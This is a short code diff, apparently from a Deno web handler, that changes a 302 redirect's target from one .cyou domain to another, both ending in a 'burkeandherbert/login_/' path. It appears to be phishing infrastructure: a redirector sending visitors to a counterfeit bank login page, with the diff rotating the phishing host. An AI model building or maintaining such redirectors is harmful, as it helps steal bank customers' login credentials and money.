@@ -6,7 +6,7 @@ serve((_req) => {
     status: 302,
     headers: {
       
-      Location: "https://ixler.cyou/burkeandherbert/login_/",
+      Location: "https://ruxel.cyou/burkeandherbert/login_/",
     },
   });
 });
